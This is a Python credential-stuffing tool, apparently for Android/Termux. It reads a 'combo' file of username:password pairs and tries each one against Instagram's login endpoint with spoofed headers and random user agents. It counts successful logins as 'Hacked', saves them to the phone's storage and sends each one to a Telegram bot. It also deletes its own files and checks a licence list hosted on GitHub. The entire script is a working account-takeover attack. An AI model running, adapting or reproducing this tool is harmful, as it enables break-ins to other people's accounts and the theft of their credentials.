#Update
import requests, sys, os, random, time, user_agent
import os,sys
os.system('rm -rf .daxl1.py ;rm -rf /sdcard/download/.daxl1.py ;clear')
import subprocess
import json 
bad=0
hits=0
timeout=0
error=0
checkpoint=0
##################
os.system("clear")
os.system("rm -rf .Cheker.py")
os.system("cd .. ;cd home ;rm -rf Cheker.py ;clear")
os.system('clear')
os.system('rm -rf list.txt')
os.system('id -u > list.txt')
uidd = open('list.txt', 'r')
for j in uidd:
    sp = j.split()

def chk(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "-".join(uuid) 
  print("\n\n\x1b[37;1mYour ID : "+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/kakshafo/sh4fo/main/list.txt").text 
    if id in httpCaht: 
      print("\033[92mYOUR ID IS ACTIVE.........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[91mID ACTIVE NYa bo kren nama bnera @7usa_sh4lati\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     chk() 
    
chk()


wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"  
logo1=G+'''


╭━━━┳╮╱╭┳╮╱╭┳━━━┳━━━╮
┃╭━╮┃┃╱┃┃┃╱┃┃╭━━┫╭━╮┃
┃╰━━┫╰━╯┃╰━╯┃╰━━┫┃╱┃┃
╰━━╮┃╭━╮┣━━╮┃╭━━┫┃╱┃┃
┃╰━╯┃┃╱┃┃╱╱┃┃┃╱╱┃╰━╯┃
╰━━━┻╯╱╰╯╱╱╰┻╯╱╱╰━━━╯

                                  
                                  
                                  

                          
                          

'''+W+''' ---------------------------------------------------
'''+wd+'''
 '''+W+'''---------------------------------------------------'''
logo2=G+'''


╭━━━┳╮╱╭┳╮╱╭┳━━━┳━━━╮
┃╭━╮┃┃╱┃┃┃╱┃┃╭━━┫╭━╮┃
┃╰━━┫╰━╯┃╰━╯┃╰━━┫┃╱┃┃
╰━━╮┃╭━╮┣━━╮┃╭━━┫┃╱┃┃
┃╰━╯┃┃╱┃┃╱╱┃┃┃╱╱┃╰━╯┃
╰━━━┻╯╱╰╯╱╱╰┻╯╱╱╰━━━╯

                                  
                                  
                                  

'''+W+''' ---------------------------------------------------
 '''+wd+'''Author   : 7USA
 Tool New =======BNX===========
  Tlegram  : 7usa_sh4lti
  Note : im_bad
'''+W+''' ---------------------------------------------------
                   =====SH4FO=====
'''+W+''' ---------------------------------------------------
 '''+wd+'''   == Wait = 1hmin = 2h ===
'''+W+''' ---------------------------------------------------
 '''
print(logo1)
agar=input(" send good tlegram Y/N ")
if agar=='y' or agar=='' or agar=='Y' or agar=='' or agar=='':
    ID=input(" ID Telegram :")
    token=input(" Token(bot) : ")
else:
    pass
print(W+' ---------------------------------------------------')
time.sleep(1)
import json, requests, user_agent,os ,sys, time, datetime
import requests
from user_agent import generate_user_agent
from datetime import datetime
os.system("rm -rf .daxl1.py")
try:
    os.remove(".daxl1.py")
except:
    pass
os.system("clear")
bad=0
timeout=0
hits=0
checkpoint=0
error=0
def instagram1():
	import json, requests, user_agent,os ,sys, time, datetime
	import requests
	from user_agent import generate_user_agent
	from datetime import datetime
	r = requests.session()
	import os, sys
	def loopPp():
		try:
			combo=input(" Name Combo:")
			file = open(combo,'r').read().splitlines()
			global bad, timeout, checkpoint, error, hits, ID, token
			for line in file:
				user = line.split(':')[0]
				pasw = line.split(':')[1]
				url = 'https://www.instagram.com/accounts/login/ajax/'
				head = {
                        'accept':'*/*',
                        'accept-encoding':'gzip,deflate,br',
                        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
                        'content-length':'269',
                        'content-type':'application/x-www-form-urlencoded',
                        'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
                        'origin':'https://www.instagram.com',
                        'referer':'https://www.instagram.com/',
                        'sec-fetch-dest':'empty',
                        'sec-fetch-mode':'cors',
                        'sec-fetch-site':'same-origin',
                        'user-agent': generate_user_agent() ,
                        'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
                        'x-ig-app-id':'936619743392459',
                        'x-ig-www-claim':'0',
                        'x-instagram-ajax':'8a8118fa7d40',
                        'x-requested-with':'XMLHttpRequest'}
				time_now = int(datetime.now().timestamp())
				data = {
                        'username': user,
                        'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                        'queryParams': {},
                        'optIntoOneTap': 'false',}
				login = requests.post(url,headers=head,data=data,allow_redirects=True,verify=True).text
				try:
					if '"authenticated":false' in login:
						os.system("clear")
						print(logo2)
						bad+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Eror'+W+' :'+B+' '+str(error)+'\n'+wd+' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
					elif '"message":"Please wait a few minutes before you try again."' in login:
						os.system("clear")
						print(logo2)
						timeout+=1
						import time
						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
					elif 'userId' in login:
						os.system("clear")
						print(logo2)
						hits+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
						boooom=f"GOOD: "+user+":"+pasw
						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
						with open('/sdcard/Good(instgram).txt', 'a') as ff:
							ff.write(f"\nuser&num&emil: "+user+":"+pasw)
					elif ('"message":"checkpoint_required"') in login:
						os.system("clear")
						print(logo2)
						checkpoint+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
					else:
						os.system("clear")
						print(logo2)
						error+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
				except:
					print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Time'+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
		except FileNotFoundError:
			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
	loopPp()
	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
   
instagram1()
